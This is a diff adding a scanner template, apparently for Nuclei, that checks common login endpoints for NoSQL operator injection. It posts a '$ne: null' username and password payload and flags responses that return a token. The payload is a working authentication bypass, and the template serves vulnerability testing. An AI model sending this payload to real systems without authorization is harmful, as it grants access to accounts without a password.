@@ -1,0 +1,31 @@
+id: nosql-operator-auth-bypass
+info:
+  name: NoSQL operator injection in login
+  severity: critical
+  description: The login endpoint passes JSON straight into a NoSQL query, so a query operator instead of a value ($ne / $gt) matches any record and authenticates without a password. Confirmed by a successful-login response to an operator payload.
+  tags: vuln,nosql,injection,auth-bypass
+  metadata:
+    category: vulnerabilities
+    cwe: CWE-943
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/auth/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+    headers:
+      Content-Type: application/json
+    body: '{"username":{"$ne":null},"password":{"$ne":null}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"token"'
+          - '"auth_token"'
+          - '"jwt"'
+          - '"success":true'
+        condition: or
+      - type: status
+        status:
+          - 200
